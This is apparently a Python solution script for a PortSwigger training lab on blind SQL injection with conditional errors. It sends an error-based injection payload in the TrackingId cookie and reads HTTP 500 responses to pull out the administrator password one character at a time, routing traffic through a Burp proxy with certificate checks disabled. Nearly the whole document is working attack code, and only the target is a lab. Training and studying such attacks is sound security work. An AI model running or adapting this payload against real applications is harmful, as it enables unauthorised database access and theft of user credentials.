# Portswigger Lab: Blind SQL injection with conditional errors
# https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors
# Author: d1Zzy666
# Date: 15-10-2024

"""
Execution path:
+ Identify SQL injection point (MANUAL)
- Charset needs to include lowercase and numbers.
- Password length is 20 characters.
- Loop through to identify administrator password.
"""

"""
Boolean options:
FALSE - HTTP Status code 200 OK
TRUE - HTTP Status code 500 Internal Server Error
"""

# Libraries & imports etc.
from datetime import datetime
from http import HTTPStatus
from multiprocessing import Process                                   
import requests
from socketserver import TCPServer
import time
import urllib3                                  # Used to suppress SSL warnings

# global variables
labid = "0a5d006f04b4ce6080dc0814005200a3"              # UPDATE
targetdomain = "web-security-academy.net"
sessionid = "WSb2MzUQgU53cRpLuk62h2tzgstfymm3"          # UPDATE
trackingid = "B7f71YCyBkA6jtmZ"                         # UPDATE

charset = "abcdefghijklmnopqrstuvwxyz0123456789"
truetxt = "Internal Server Error"

# Proxy via BURP
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

# Function can be called for printing a line between - aesthetics of output	
def line():
	return "\n--------------------------------------------------------------------------------\n"

# Check current time
def currentTime():
    return datetime.now().strftime("%d-%m-%Y_%H:%M:%S")

print(datetime.now().strftime("%d-%m-%Y_%H:%M:%S") + " " + " - Portswigger Lab: Blind SQL injection with conditional errors...")
print(line())

# Password retrieval function
def passwdretrieval():
    adminpassword = ""
    position = 1
    session = requests.session()
    urllib3.disable_warnings()
    (print("Retrieving administrator password..."))
       
    while True:
        found_char = False
        for char in charset:
            url = f"https://{labid}.{targetdomain}:443/"
            payload = f"'||(SELECT+CASE+WHEN+SUBSTR(password,{position},1)%3d'{char}'+THEN+TO_CHAR(1/0)+ELSE+''+END+FROM+users+WHERE+username%3d'administrator')||'"
            
            cookies = {"TrackingId": f"{trackingid}{payload}", "session": f"{sessionid}"}
            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "none", "Sec-Fetch-User": "?1", "Te": "trailers"}
            x = session.get(url, cookies=cookies, headers=headers, verify=False, proxies=proxies)

            if (x.status_code == 500):
                adminpassword += char
                print(f"[+] Identified a character {char} at position {position}.")
                position += 1
                found_char = True
                break

        if not found_char:
            break

    print(f"Administrator password: {adminpassword}")
    print("\n")


if __name__ == "__main__":
    passwdretrieval()
